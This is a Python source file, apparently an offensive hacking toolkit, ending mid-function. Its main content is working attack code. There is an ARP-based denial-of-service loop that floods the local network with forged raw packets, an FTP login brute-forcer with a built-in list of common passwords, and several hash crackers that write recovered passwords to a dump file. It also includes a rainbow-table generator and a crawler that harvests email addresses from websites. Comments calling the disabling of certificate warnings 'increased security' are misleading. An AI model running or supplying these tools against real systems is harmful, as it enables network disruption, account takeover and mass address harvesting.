#try block for termux
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import *
    from selenium.webdriver.firefox.service import *
    from webdriver_manager.firefox import *

except:
    pass

from collections import *
from os import name
from subprocess import run

import binascii
import codecs
import base64
import hashlib
import ftplib
import ipaddress
import itertools
import math
import numpy as np
import os
import random
import re
import requests
import socket
import struct
import threading
import time
import urllib3
import uuid

red = "\033[1;31m"

#create html sessions object
web_session = requests.Session()

#fake user agent
user_agent = {"User-Agent" : "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"}

#increased security
requests.packages.urllib3.disable_warnings()
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ":HIGH:!DH:!aNULL"

#increased security
try:
    requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ":HIGH:!DH:!aNULL"

except AttributeError:
    pass

#global variables mainly used for multi-threading
host_up_list = []
nmap_list = []
open_port_list = []

password_list = ["admin","administrator","password","root","support","123456","qwerty","12345678","qwerty123","1234567","1234567890","DEFAULT","000000","iloveyou","qwertyuiop","654321","123456a","dragon","1qaz2wsx","123qwe","7777777","123","zxcvbnm","123abc","555555","qwerty1","222222","asdfghjkl","123123123","target123","tinkle","159753","1234qwer","computer","michael","11111111","aaaaaa","ashley","789456123","999999","shadow","iloveyou1","123456789a","888888","qwer1234","fuckyou1","azerty","q1w2e3r4","baseball","princess1","asd123","asdasd","soccer"]

#denial of service attack against local area network using an arp void attack
def arp_void(router):
    clear()

    mac = hex(uuid.getnode())
    og_mac = str(mac).replace("0x", "")
    mac = ":".join(mac[i:i + 2] for i in range(0, len(mac), 2))  
    mac = str(mac).replace("0x:", "")
    
    host_name = socket.gethostname()
    host_ip = socket.gethostbyname(host_name)
    og_ip = host_ip.replace(".", "")

    interface = socket.if_nameindex()

    print(red + "mac address: " + mac + " | ip address: " + router + " | interface: " + str(interface[1][1]))

    router = hex(int(ipaddress.IPv4Address(router)))
    router = str(router).replace("0x", "")
    
    while True:
        

        try:
            try:
                my_code = binascii.unhexlify("ffffffffffff" + og_mac + "08060001080006040002"  + og_mac + router + "ffffffffffff" + "00000000")
                super_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
                super_socket.bind((interface[1][1], 0))
                super_socket.sendall(my_code)
                print("packet sent")

            except binascii.Error:
                pass

        except:
            print(red + "ERROR!")
            continue

#machine learning antivirus detect engine
def av_detect(virus, learn):
    clear()
    ml_virus = av_learn(learn)
    
    list_files = []
    ml_list = []
    possible = []

    progress = 0
    progress_count = 0
    total_progress = 0

    print(red + "preparing")

    for root, dirs, files in os.walk(virus, topdown = True):
        if len(dirs) > 0:
            for directory in dirs:
                for file in files:
                    progress_count += 1
                    list_files.append(root + directory + "/" + file)

        else:
            for file in files:
                progress_count += 1
                list_files.append(root + "/" + file)

    list_files.sort()

    counter = 0

    clear()
    
    print(red + "progress: " + str(total_progress) + "%")

    for file in list_files:
        progress += 1

        if progress == int(progress_count / 100):
            progress = 0
            total_progress += 1
            print(red + "progress: " + str(total_progress) + "%")
        
        try:
            if os.path.isfile(file) and os.path.getsize(file) > 0:
                with open(file, "rb") as f:
                    
                    for chunk in iter(lambda: f.read(128), b""):
                        try:
                            ascii_convert = codecs.decode(chunk, "utf8")
                        
                            clean = str(ascii_convert).replace("b", "")
                            clean = clean.replace("'", "")
                            clean = clean.replace("\x00", "")
                            clean = clean.replace("\x11", "")

                            if clean != "":
                                ml_list.append(clean)
                                
                        except:
                            pass

                ml_list = list(dict.fromkeys(ml_list))

                for string in ml_list:
                    for i in ml_virus:
                        if string == i:
                            counter += 1

                if counter > 0:
                    possible.append(file + ": " + str(counter) + "%")
                    
                counter = 0
                ml_list = []

        except:
            pass

    clear()
    possible.sort()
    
    for i in possible:
        print(i)

#machine learning antivirus learn engine
def av_learn(virus_folder):
    clear()
    list_files = []
    counter_array = np.array([])
    ml_array = np.array([])
    ml_list = []

    print(red + "preparing")

    for root, dirs, files in os.walk(virus_folder, topdown = True):
       for name in files:
          list_files.append(name)

    list_files.sort()

    for file in list_files:
        try:
            if os.path.isfile(virus_folder + "/" + file) and os.path.getsize(virus_folder + "/" + file) > 0:
                with open(virus_folder + "/" + file, "rb") as f:
                    print(red + "learning from: " + file)
                    
                    for chunk in iter(lambda: f.read(128), b""):
                        try:
                            ascii_convert = codecs.decode(chunk, "utf8")
                        
                            clean = str(ascii_convert).replace("b", "")
                            clean = clean.replace("'", "")
                            clean = clean.replace("\x00", "")
                            clean = clean.replace("\x11", "")

                            if clean != "":
                                ml_list.append(clean)
                                
                        except:
                            pass

        except FileNotFoundError:
            pass

    ml_array = np.array(ml_list)
    counter = str(Counter(ml_array).most_common(100))

    super_clean = counter.replace("[", "")
    super_clean = super_clean.replace("]", "")
    super_clean = super_clean.replace("('", "~")
    super_clean = super_clean.replace(")", "")
    super_clean = super_clean.replace("',", "`")
    counter_list = list(super_clean)

    counter_boolean = False
    my_string = ""
    super_counter = []

    for i in counter_list:
        if i == "`":
            my_string = my_string.replace("~", "")
            super_counter.append(my_string)
            my_string = ""
            counter_boolean = False

        if i == "~":
            counter_boolean = True

        if counter_boolean == True:
            my_string += i

    clear()

    return super_counter

#brute force hash
def brute_force_hash(my_hash, minimum = 1, maximum = 36, timer = 60, mask = ""):
    dictionary = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ "
    crack_boolean = False
    timer *= 60
    hash_count = 0
    my_hash = my_hash.lower()

    clear()

    blake2b = ""
    blake2s = ""
    md5 = ""
    sha1 = ""
    sha224 = ""
    sha256 = ""
    sha512 = ""
    sha3256 = ""
    sha3384 = ""
    sha3512 = ""

    if mask == "":
        for i in range (minimum, maximum):
            if crack_boolean == True:
                break
            
            print(red + "attempting length: " + str(i))
            
            for ii in itertools.product(dictionary, repeat = i):
                compute = "".join(ii)
                hash_count += 1
                
                if len(my_hash) == 32:
                    md5 = hashlib.md5(compute.encode("utf8")).hexdigest()

                if len(my_hash) == 40:
                    sha1 = hashlib.sha1(compute.encode("utf8")).hexdigest()

                if len(my_hash) == 56:
                    sha224 = hashlib.sha224(compute.encode("utf8")).hexdigest()

                if len(my_hash) == 64:
                    blake2s = hashlib.blake2s(compute.encode("utf8")).hexdigest()
                    sha256 = hashlib.sha256(compute.encode("utf8")).hexdigest()
                    sha3256 = hashlib.sha3_256(compute.encode("utf8")).hexdigest()

                if len(my_hash) == 96:
                    sha3384 = hashlib.sha3_384(compute.encode("utf8")).hexdigest()

                if len(my_hash) == 128:
                    blake2b = hashlib.blake2b(compute.encode("utf8")).hexdigest()
                    sha512 = hashlib.sha512(compute.encode("utf8")).hexdigest()
                    sha3512 = hashlib.sha3_512(compute.encode("utf8")).hexdigest()

                if str(blake2b) == my_hash:
                    crack_boolean = True
                    print(red + "password: " + str(compute))
                    break

                if str(blake2s) == my_hash:
                    crack_boolean = True
                    print(red + "password: " + str(compute))
                    break

                if str(md5) == my_hash:
                    crack_boolean = True
                    print(red + "password: " + str(compute))
                    break

                if str(sha1) == my_hash:
                    crack_boolean = True
                    print(red + "password: " + str(compute))
                    break

                if str(sha224) == my_hash:
                    crack_boolean = True
                    print(red + "password: " + str(compute))
                    break

                if str(sha256) == my_hash:
                    crack_boolean = True
                    print(red + "password: " + str(compute))
                    break

                if str(sha512) == my_hash:
                    crack_boolean = True
                    print(red + "password: " + str(compute))
                    break

                if str(sha3256) == my_hash:
                    crack_boolean = True
                    print(red + "password: " + str(compute))
                    break

                if str(sha3384) == my_hash:
                    crack_boolean = True
                    print(red + "password: " + str(compute))
                    break

                if str(sha3512) == my_hash:
                    crack_boolean = True
                    print(red + "password: " + str(compute))
                    break

        print(red + "hashes computed: " + str(hash_count))

    if mask != "":
        for i in range (minimum, maximum):
            start = time.time()

            if crack_boolean == True:
                break
            
            print(red + "attempting length: " + str(i))
            
            for ii in itertools.product(dictionary, repeat = i):
                var = "".join(ii)
                compute = mask + var
                hash_count += 1
                
                if len(my_hash) == 32:
                    md5 = hashlib.md5(compute.encode("utf8")).hexdigest()

                if len(my_hash) == 40:
                    sha1 = hashlib.sha1(compute.encode("utf8")).hexdigest()

                if len(my_hash) == 56:
                    sha224 = hashlib.sha224(compute.encode("utf8")).hexdigest()

                if len(my_hash) == 64:
                    blake2s = hashlib.blake2s(compute.encode("utf8")).hexdigest()
                    sha256 = hashlib.sha256(compute.encode("utf8")).hexdigest()
                    sha3256 = hashlib.sha3_256(compute.encode("utf8")).hexdigest()

                if len(my_hash) == 96:
                    sha3384 = hashlib.sha3_384(compute.encode("utf8")).hexdigest()

                if len(my_hash) == 128:
                    blake2b = hashlib.blake2b(compute.encode("utf8")).hexdigest()
                    sha512 = hashlib.sha512(compute.encode("utf8")).hexdigest()
                    sha3512 = hashlib.sha3_512(compute.encode("utf8")).hexdigest()

                if str(blake2b) == my_hash:
                    crack_boolean = True
                    print(red + "password: " + str(compute))
                    break

                if str(blake2s) == my_hash:
                    crack_boolean = True
                    print(red + "password: " + str(compute))
                    break

                if str(md5) == my_hash:
                    crack_boolean = True
                    print(red + "password: " + str(compute))
                    break

                if str(sha1) == my_hash:
                    crack_boolean = True
                    print(red + "password: " + str(compute))
                    break

                if str(sha224) == my_hash:
                    crack_boolean = True
                    print(red + "password: " + str(compute))
                    break

                if str(sha256) == my_hash:
                    crack_boolean = True
                    print(red + "password: " + str(compute))
                    break

                if str(sha512) == my_hash:
                    crack_boolean = True
                    print(red + "password: " + str(compute))
                    break

                if str(sha3256) == my_hash:
                    crack_boolean = True
                    print(red + "password: " + str(compute))
                    break

                if str(sha3384) == my_hash:
                    crack_boolean = True
                    print(red + "password: " + str(compute))
                    break

                if str(sha3512) == my_hash:
                    crack_boolean = True
                    print(red + "password: " + str(compute))
                    break

        print(red + "hashes computed: " + str(hash_count))
        
#clear console (platform independent)
def clear():
    if name == "nt":
        os.system("cls")

    else:
        os.system("clear")

def create_rainbow(hash_type = "md5", name = "rainbow table.csv", minimum = 1, maximum = 36):
    dictionary = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()`~-_=+[{]}\\|;:\'\",<.>/?"
    hash_count = 0

    clear()

    for i in range (minimum, maximum + 1):
        print(red + "generating length: " + str(i))

        for ii in itertools.product(dictionary, repeat = i):
            hash_count += 1
            compute = "".join(ii)

            if hash_type == "md5":
                my_hash = hashlib.md5(compute.encode("utf8")).hexdigest()

            if hash_type == "sha1":
                my_hash = hashlib.sha1(compute.encode("utf8")).hexdigest()

            if hash_type == "sha256":
                my_hash = hashlib.sha256(compute.encode("utf8")).hexdigest()

            if hash_type == "sha3256":
                my_hash = hashlib.sha3_256(compute.encode("utf8")).hexdigest()

            with open("rainbow table.csv", "a") as file:
                file.write(str(my_hash) + " " + str(compute) + "\n")

    print(red + "hashes computed: " + str(hash_count))

#brute force hash using dictionary method
def dictionary_hash(my_file, my_hash = " ", hash_list = " ", mask = False, minimum = 1, maximum = 10):
    clear()

    my_hash = my_hash.lower()

    dictionary = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ "

    hashes = {"blake2b" : 128, "blake2s" : 64, "md5" : 32, "sha1" : 40, "sha224" : 56, "sha256" : 64, "sha512" : 128, "sha3_256" : 64, "sha3_384" : 96, "sha3_512" : 128}

    blake2b = ""
    blake2s = ""
    md5 = ""
    sha1 = ""
    sha224 = ""
    sha256 = ""
    sha512 = ""
    sha3256 = ""
    sha3384 = ""
    sha3512 = ""

    crack_boolean = False
    my_hash_list = []
    password_list = []
    word_list = []

    print(red + "cracking hash")

    if hash_list == " " and my_hash != " ":
        with open(my_file, "r", errors = "ignore") as file:
            for i in file:
                clean = i.replace("\n", "")
                word_list.append(clean)

        if mask == False:
            for i in range (minimum, maximum + 1):
                if crack_boolean == True:
                    break
                
                print(red + "attempting length: " + str(i))

                for ii in itertools.product(word_list, repeat = i):
                    compute = "".join(ii)

                    if len(my_hash) == 32:
                        md5 = hashlib.md5(compute.encode("utf8")).hexdigest()

                    if len(my_hash) == 40:
                        sha1 = hashlib.sha1(compute.encode("utf8")).hexdigest()

                    if len(my_hash) == 56:
                        sha224 = hashlib.sha224(compute.encode("utf8")).hexdigest()

                    if len(my_hash) == 64:
                        blake2s = hashlib.blake2s(compute.encode("utf8")).hexdigest()
                        sha256 = hashlib.sha256(compute.encode("utf8")).hexdigest()
                        sha3256 = hashlib.sha3_256(compute.encode("utf8")).hexdigest()

                    if len(my_hash) == 96:
                        sha3384 = hashlib.sha3_384(compute.encode("utf8")).hexdigest()

                    if len(my_hash) == 128:
                        blake2b = hashlib.blake2b(compute.encode("utf8")).hexdigest()
                        sha512 = hashlib.sha512(compute.encode("utf8")).hexdigest()
                        sha3512 = hashlib.sha3_512(compute.encode("utf8")).hexdigest()

                    if str(blake2b) == my_hash:
                        crack_boolean = True
                        print(red + "password: " + str(compute))
                        break

                    if str(blake2s) == my_hash:
                        crack_boolean = True
                        print(red + "password: " + str(compute))
                        break

                    if str(md5) == my_hash:
                        crack_boolean = True
                        print(red + "password: " + str(compute))
                        break

                    if str(sha1) == my_hash:
                        crack_boolean = True
                        print(red + "password: " + str(compute))
                        break

                    if str(sha224) == my_hash:
                        crack_boolean = True
                        print(red + "password: " + str(compute))
                        break

                    if str(sha256) == my_hash:
                        crack_boolean = True
                        print(red + "password: " + str(compute))
                        break

                    if str(sha512) == my_hash:
                        crack_boolean = True
                        print(red + "password: " + str(compute))
                        break

                    if str(sha3256) == my_hash:
                        crack_boolean = True
                        print(red + "password: " + str(compute))
                        break

                    if str(sha3384) == my_hash:
                        crack_boolean = True
                        print(red + "password: " + str(compute))
                        break

                    if str(sha3512) == my_hash:
                        crack_boolean = True
                        print(red + "password: " + str(compute))
                        break

        if mask == True:
            for i in range (minimum, maximum + 1):
                if crack_boolean == True:
                    break

                print(red + "attempting length: " + str(i))

                for words in word_list:
                    if crack_boolean == True:
                        break

                    print("checking: " + words)

                    for ii in itertools.product(dictionary, repeat = i):
                        var = "".join(ii)
                        compute = words + var

                        if len(my_hash) == 32:
                            md5 = hashlib.md5(compute.encode("utf8")).hexdigest()

                        if len(my_hash) == 40:
                            sha1 = hashlib.sha1(compute.encode("utf8")).hexdigest()

                        if len(my_hash) == 56:
                            sha224 = hashlib.sha224(compute.encode("utf8")).hexdigest()

                        if len(my_hash) == 64:
                            blake2s = hashlib.blake2s(compute.encode("utf8")).hexdigest()
                            sha256 = hashlib.sha256(compute.encode("utf8")).hexdigest()
                            sha3256 = hashlib.sha3_256(compute.encode("utf8")).hexdigest()

                        if len(my_hash) == 96:
                            sha3384 = hashlib.sha3_384(compute.encode("utf8")).hexdigest()

                        if len(my_hash) == 128:
                            blake2b = hashlib.blake2b(compute.encode("utf8")).hexdigest()
                            sha512 = hashlib.sha512(compute.encode("utf8")).hexdigest()
                            sha3512 = hashlib.sha3_512(compute.encode("utf8")).hexdigest()

                        if str(blake2b) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            break

                        if str(blake2s) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            break

                        if str(md5) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            break

                        if str(sha1) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            break

                        if str(sha224) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            break

                        if str(sha256) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            break

                        if str(sha512) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            break

                        if str(sha3256) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            break

                        if str(sha3384) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            break

                        if str(sha3512) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            break

    if hash_list != " " and my_hash == " ":
        with open(hash_list, "r", errors = "ignore") as file:
            for i in file:
                clean = i.replace("\n", "")
                my_hash_list.append(clean)

        with open(my_file, "r", errors = "ignore") as file:
            for i in file:
                clean = i.replace("\n", "")
                word_list.append(clean)

        for my_hash in my_hash_list:   
            my_hash = my_hash.lower()

            if mask == False:
                for i in range (minimum, maximum + 1):
                    if crack_boolean == True:
                        crack_boolean = False
                        break
                    
                    print(red + "attempting length: " + str(i))

                    for ii in itertools.product(word_list, repeat = i):
                        compute = "".join(ii)

                        if len(my_hash) == 32:
                            md5 = hashlib.md5(compute.encode("utf8")).hexdigest()

                        if len(my_hash) == 40:
                            sha1 = hashlib.sha1(compute.encode("utf8")).hexdigest()

                        if len(my_hash) == 56:
                            sha224 = hashlib.sha224(compute.encode("utf8")).hexdigest()

                        if len(my_hash) == 64:
                            blake2s = hashlib.blake2s(compute.encode("utf8")).hexdigest()
                            sha256 = hashlib.sha256(compute.encode("utf8")).hexdigest()
                            sha3256 = hashlib.sha3_256(compute.encode("utf8")).hexdigest()

                        if len(my_hash) == 96:
                            sha3384 = hashlib.sha3_384(compute.encode("utf8")).hexdigest()

                        if len(my_hash) == 128:
                            blake2b = hashlib.blake2b(compute.encode("utf8")).hexdigest()
                            sha512 = hashlib.sha512(compute.encode("utf8")).hexdigest()
                            sha3512 = hashlib.sha3_512(compute.encode("utf8")).hexdigest()

                        if str(blake2b) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            password_list.append(str(compute))
                            break

                        if str(blake2s) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            password_list.append(str(compute))
                            break

                        if str(md5) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            password_list.append(str(compute))
                            break

                        if str(sha1) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            password_list.append(str(compute))
                            break

                        if str(sha224) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            password_list.append(str(compute))
                            break

                        if str(sha256) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            password_list.append(str(compute))
                            break

                        if str(sha512) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            password_list.append(str(compute))
                            break

                        if str(sha3256) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            password_list.append(str(compute))
                            break

                        if str(sha3384) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            password_list.append(str(compute))
                            break

                        if str(sha3512) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            password_list.append(str(compute))
                            break

        if mask == True:
            for i in range (minimum, maximum + 1):
                if crack_boolean == True:
                    break

                print(red + "attempting length: " + str(i))

                for words in word_list:
                    if crack_boolean == True:
                        crack_boolean = False
                        break

                    print("checking: " + words)

                    for ii in itertools.product(dictionary, repeat = i):
                        var = "".join(ii)
                        compute = words + var

                        if len(my_hash) == 32:
                            md5 = hashlib.md5(compute.encode("utf8")).hexdigest()

                        if len(my_hash) == 40:
                            sha1 = hashlib.sha1(compute.encode("utf8")).hexdigest()

                        if len(my_hash) == 56:
                            sha224 = hashlib.sha224(compute.encode("utf8")).hexdigest()

                        if len(my_hash) == 64:
                            blake2s = hashlib.blake2s(compute.encode("utf8")).hexdigest()
                            sha256 = hashlib.sha256(compute.encode("utf8")).hexdigest()
                            sha3256 = hashlib.sha3_256(compute.encode("utf8")).hexdigest()

                        if len(my_hash) == 96:
                            sha3384 = hashlib.sha3_384(compute.encode("utf8")).hexdigest()

                        if len(my_hash) == 128:
                            blake2b = hashlib.blake2b(compute.encode("utf8")).hexdigest()
                            sha512 = hashlib.sha512(compute.encode("utf8")).hexdigest()
                            sha3512 = hashlib.sha3_512(compute.encode("utf8")).hexdigest()

                        if str(blake2b) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            password_list.append(str(compute))
                            break

                        if str(blake2s) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            password_list.append(str(compute))
                            break

                        if str(md5) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            password_list.append(str(compute))
                            break

                        if str(sha1) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            password_list.append(str(compute))
                            break

                        if str(sha224) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            password_list.append(str(compute))
                            break

                        if str(sha256) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            password_list.append(str(compute))
                            break

                        if str(sha512) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            password_list.append(str(compute))
                            break

                        if str(sha3256) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            password_list.append(str(compute))
                            break

                        if str(sha3384) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            password_list.append(str(compute))
                            break

                        if str(sha3512) == my_hash:
                            crack_boolean = True
                            print(red + "password: " + str(compute))
                            password_list.append(str(compute))
                            break

    with open("password dump.txt", "a") as f:
        for password in password_list:
            f.write(password + "\n")

    print(red + "done")

#scans for emails on a website
def email_scanner(url, secure = True):
    if secure == True:
        my_secure = "https://"

    if secure == False:
        my_secure = "http://"

    my_url = my_secure + url

    tracker = 0

    email_list = []
    website_list = []
    website_list.append(my_url)

    clear()

    while True:
        length_count = 0

        website_list = list(dict.fromkeys(website_list))
            
        try:
            stream_boolean = web_session.get(website_list[tracker], verify = False, headers = user_agent, timeout = (5, 30), stream = True)

            for i in stream_boolean.iter_lines():
                length_count += len(i)

            if length_count > 25000000:
                print(red + "too long" + ": " + str(website_list[tracker]))
                website_list.pop(tracker)

            if length_count <= 25000000 :
                status = web_session.get(website_list[tracker], verify = False, headers = user_agent, timeout = (5, 30)).status_code

                if status == 200:
                    print(red + website_list[tracker])
                    my_request = web_session.get(website_list[tracker], verify = False, headers = user_agent, timeout = (5, 30)).text

                    if len(my_request) <= 25000000:
                        tracker += 1

                        #urls
                        website = re.findall("http://|https://\S+", my_request)
                        website = list(dict.fromkeys(website))

                        for i in website:
                            try:
                                result = re.split("[%\(\)<>\[\],\{\};�|]", i)
                                result = result[0]
                                result = re.sub("[\"\']", "", result)

                            except:
                                result = i
                                
                            if url in i:
                                website_list.append(re.sub("[\\\"\']", "", result))

                        #href
                        href = re.sub(" ", "", my_request)
                        href = re.findall("href=[\"\']\S+?[\'\"]", href)
                        href = list(dict.fromkeys(href))
                        for i in href:
                            try:
                                result = re.split("[%\(\)<>\[\],\{\};�|]", i)
                                result = result[0]

                            except:
                                result = i
                            
                            result = re.sub("[\\\"\';]|href=", "", i)

                            if result.startswith("http"):
                                if url in result:
                                    website_list.append(result)

                            if result.startswith("http") == False and result[0] != "/":
                                result = re.sub(url, "", result)
                                result = re.sub("www", "", result)
                                website_list.append(my_url + "/" + result)

                            if result.startswith("http") == False and result[0] == "/":
                                result = re.sub(url, "", result)
                                result = re.sub("www", "", result)
                                website_list.append(my_url + result)

                        #action
                        action = re.sub(" ", "", my_request)
                        action = re.findall("action=[\"\']\S+?[\'\"]", action)
                        action = list(dict.fromkeys(action))
                        
                        for i in action:
                            try:
                                result = re.split("[%\(\)<>\[\],\{\};�|]", i)
                                result = result[0]

                            except:
                                result = i
                                
                            result = re.sub("[\\\"\';]|action=", "", i)

                            if result.startswith("http"):
                                if url in result:
                                    website_list.append(result)

                            if result.startswith("http") == False and result[0] != "/":
                                result = re.sub(url, "", result)
                                result = re.sub("www", "", result)
                                website_list.append(my_url + "/" + result)

                            if result.startswith("http") == False and result[0] == "/":
                                result = re.sub(url, "", result)
                                result = re.sub("www", "", result)
                                website_list.append(my_url + result)

                        #src
                        src = re.sub(" ", "", my_request)
                        src = re.findall("src=[\"\']\S+?[\'\"]", src)
                        src = list(dict.fromkeys(src))

                        for i in src:
                            try:
                                result = re.split("[%\(\)<>\[\],\{\};�|]", i)
                                result = result[0]

                            except:
                                result = i
                                
                            result = re.sub("[\\\"\';]|src=", "", i)
                            
                            if result.startswith("http"):
                                if url in result:
                                    website_list.append(result)

                            if result.startswith("http") == False and result[0] != "/":
                                result = re.sub(url, "", result)
                                result = re.sub("www", "", result)
                                website_list.append(my_url + "/" + result)

                            if result.startswith("http") == False and result[0] == "/":
                                result = re.sub(url, "", result)
                                result = re.sub("www", "", result)
                                website_list.append(my_url + result)

                        #slash
                        slash = re.findall("[\'|\"]/\S+[\"|\']", my_request)

                        for i in slash:
                            my_search = re.search("http|\.com|\.edu|\.net|\.org|\.tv|www|http", i)

                            if not my_search:
                                result = re.sub("[\"\']", "", i)
                                result = re.split("[%\(\)<>\[\],\{\};�|]", result)
                                result = result[0]
                                website_list.append(my_url + result)

                else:
                    print(red + str(status) + ": " + str(website_list[tracker]))
                    website_list.pop(tracker)

        except IndexError:
            break

        except:
            print(red + "ERROR: " + str(website_list[tracker]))
            website_list.pop(tracker)

        email = re.findall("[a-z0-9]+@[a-z0-9]+[.][a-z]+", my_request)

        for emails in email:
            email_list.append(emails)

    clear()

    email_list = list(dict.fromkeys(email_list))
    email_list.sort()

    return email_list

#downloads all media files from a website
def file_download(url, secure = True):
    clear()
    
    result = link_scanner(url, secure)

    clear()

    gif_count = 0
    jpeg_count = 0
    jpg_count = 0
    mkv_counter = 0
    mp3_count = 0
    mp4_count = 0
    pdf_count = 0
    png_count = 0

    for i in result:
        gif = re.search(".gif", i)
        jpeg = re.search(".jpeg", i)
        jpg = re.search(".jpg", i)
        mkv = re.search(".mkv", i)
        mp3 = re.search(".mp3", i)
        mp4 = re.search(".mp4", i)
        pdf = re.search(".pdf", i)
        png = re.search(".png", i)

        if gif:
            gif_count += 1

            print(red + "downloading: " + i)
            data = requests.get(i, verify = False, headers = user_agent, timeout = (5, 30)).content

            with open("file " + str(gif_count) + ".gif", "wb") as f:
                f.write(data)

            print(red + "done")
        
        if jpeg:
            jpeg_count += 1
            
            print(red + "downloading: " + i)
            data = requests.get(i, verify = False, headers = user_agent, timeout = (5, 30)).content

            with open("file " + str(jpeg_count) + ".jpeg", "wb") as f:
                f.write(data)

            print(red + "done")

        if jpg:
            jpg_count += 1
            
            print(red + "downloading: " + i)
            data = requests.get(i, verify = False, headers = user_agent, timeout = (5, 30)).content

            with open("file " + str(jpg_count) + ".jpeg", "wb") as f:
                f.write(data)

            print(red + "done")

        if mkv:
            mkv_count += 1

            print(red + "downloading: " + i)
            data = requests.get(i, verify = False, headers = user_agent, timeout = (5, 30)).content

            with open("file " + str(mkv_count) + ".mkv", "wb") as f:
                f.write(data)

            print(red + "done")

        if mp3:
            mp3_count += 1
            
            print(red + "downloading: " + i)
            data = requests.get(i, verify = False, headers = user_agent, timeout = (5, 30)).content

            with open("file " + str(mp3_count) + ".mp3", "wb") as f:
                f.write(data)

            print(red + "done")

        if mp4:
            mp4_count += 1
            
            print(red + "downloading: " + i)
            data = requests.get(i, verify = False, headers = user_agent, timeout = (5, 30)).content

            with open("file " + str(mp4_count) + ".mp4", "wb") as f:
                f.write(data)

            print(red + "done")

        if pdf:
            pdf_count += 1

            print(red + "downloading: " + i)
            data = requests.get(i, verify = False, headers = user_agent, timeout = (5, 30)).content

            with open("file " + str(pdf_count) + ".pdf", "wb") as f:
                f.write(data)

            print(red + "done")

        if png:
            png_count += 1
            
            print(red + "downloading: " + i)
            data = requests.get(i, verify = False, headers = user_agent, timeout = (5, 30)).content

            with open("file " + str(png_count) + ".png", "wb") as f:
                f.write(data)

            print(red + "done")

    print(red + "all downloads complete")

#scans for forms
def form_scanner(url, secure = True, parse = "forms"):
    if secure == True:
        my_secure = "https://"

    if secure == False:
        my_secure = "http://"

    url = my_secure + url

    try:
        result = web_session.get(url, verify = False, headers = user_agent, timeout = (5, 30)).text

        try:
            if parse == "forms":
                forms = re.findall("<form[\n\w\S\s]+?form>", result)
                return forms

            if parse == "input":
                input_form = re.findall("<input.+?>", result)
                return input_form

        except UnicodeDecodeError:
            return []

    except:
        return []

def ftp(url):
    clear()

    print(red + "checking ftp")

    my_ftp = ""

    try:
        ftp = ftplib.FTP(url, timeout = 15)
        ftp.login()
        my_ftp = "Anonymous login accepted!"

    except ConnectionRefusedError:
        my_ftp = "FTP: Connection refused!"

    except ftplib.error_perm:
        my_ftp = "Anonymous login denied!"

    except OSError:
        my_ftp = "FTP: Network is unreachable!"

    print(red + my_ftp)

#attempts to crack an ftp servers password
def ftp_cracker(url, word_list = " "):
    clear()
    global password_list

    user_list = ["admin", "administrator", "root", "support"]

    if word_list != " ":
        for user in user_list:
            with open(word_list, "r") as f:
                for i in f:
                    key = i.replace("\n", "")
            
                    try:
                        ftp = ftplib.FTP(url, timeout = 15)
                        ftp.login(user, key)

                        clear()
                        
                        print(red + "True: " + user + ":" + key)
                        break

                    except:
                        print(red + "False: " + user + ":" + key)

    if word_list == " ":
        for user in user_list:
            for key in password_list: 
                try:
                    ftp = ftplib.FTP(url, timeout = 15)
                    ftp.login(user, key)

                    clear()
                    
                    print(red + "True: " + user + ":" + key)
                    break

                except:
                    print(red + "False: " + user + ":" + key)

def hex_viewer(file):
    clear()

    count = 0

    my_string = ""
    
    with open(file, "rb") as f:
        for chunk in iter(lambda: f.read(2), b""):
            try:
                hex_code = codecs.decode(chunk, "hex")
                clean = str(hex_code).replace("b", "")
                clean = clean.replace("'", "")
                clean = clean.replace("\\", "")
                clean = clean.replace("x", "")

                my_string += clean

                count += 1

                if count == 64:
                    print(red + my_string)
                    
                    count = 0
                    my_string = ""
                    
            except:
                pass

    print("\ndone")

def host_up(port, i, ii, iii, iv):
